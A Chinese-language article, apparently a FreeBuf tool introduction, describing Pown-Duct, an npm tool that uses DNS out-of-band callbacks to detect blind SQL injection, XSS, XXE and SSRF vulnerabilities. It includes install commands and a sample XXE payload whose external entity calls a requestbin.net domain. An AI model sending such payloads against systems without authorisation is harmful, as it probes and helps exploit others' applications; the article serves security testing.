***本工具仅供技术分享、交流讨论，严禁用于非法用途**

 **今天给大家介绍的是一款名叫Pown-Duct的工具，该工具基于DNS测信道实现其功能，广大研究人员可以利用Pown-Duct来有效检测盲注攻击向量。**

## 注意事项

该工具利是secapps.com开源计划的一部分。

![a.png](https://image.3001.net/images/20190727/1564189540_5d3ba3647e338.png!small)

该工具利用了<http://requestbin.net/>服务，之后的版本还将引入专用的自定义构建框架。

## 快速开始

该工具必须作为Pown.js的一部分来使用，但是也可以将其作为单独工具来调用。

请先使用下列命令安装Pown：

    
    
    $ npm install -g pown@latest

从Pown直接调用：

    
    
    $ pown duct

当然了，你也可以直接在项目根目录本地安装这个模块：

    
    
    $ npm install @pown/duct –save

完成之后，调用pown命令行工具：

    
    
    $ ./node_modules/.bin/pown-cli duct

你也可以使用全局pown来调用本地工具：

    
    
    $POWN_ROOT=. pown duct

## 工具使用

    
    
    pown duct <command>
    
    Side-channelattack enabler
    
    Commands:
    
      pown duct dns DNS ducting
    
    Options:
    
      --version Show version number  [boolean]
    
      --help    Show help  [boolean]

## Pown-Duct DNS

    
    
    pown duct dns
    
    DNS ducting
    
    Options:
    
      --version Show version number  [boolean]
    
      --help    Show help  [boolean]
    
      --channel Restore channel  [string]
    
      --output  Output format  [string] [choices:"string", "hexdump", "json"] [default:"string"]

## 工具指南

在某些情况下，我们需要执行类似SQL注入、XSS、XXE或SSRF这样的攻击，但目标应用程序却没有“表现”出任何容易受到攻击的特征。因此，为了确定目标应用程序是否存在漏洞，并尝试注入有效的攻击向量，我们可以强制让DNS解析程序去请求控制域。如果解析成功，那么攻击就有可能实现了。

如果大家了解或者熟悉Burp Collaborator的话，可能就秒懂了，Pown-Duct提供的也是类似的功能。

首先，我们需要提供一个用于解析的一次性DNS域名：

    
    
    $ pown duct dns

![b.png](https://image.3001.net/images/20190727/1564189614_5d3ba3ae1fbe8.png!small)

使用提供的DNS来构成我们的Payload。比如说，如果目标应用程序存在XXE漏洞的话，下列代码将会触发DNS解析操作：

    
    
    <!DOCTYPE foo [
    
    <!ELEMENTfoo ANY>
    
    <!ENTITYbar SYSTEM"<http://showmethemoney.bfa8b8d3c25f09d5429f.d.requestbin.net>">
    
    ]>
    
    <foo>
    
    &ampbar
    
    </foo>

如果攻击成功，我们将会看到类似如下图所示的终端信息：

![c.png](https://image.3001.net/images/20190727/1564189632_5d3ba3c0505ec.png!small)

### 项目地址

> Pown-Duck：【[GitHub传送门](https://github.com/pownjs/pown-duct)】

 *** 参考来源：pownjs，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

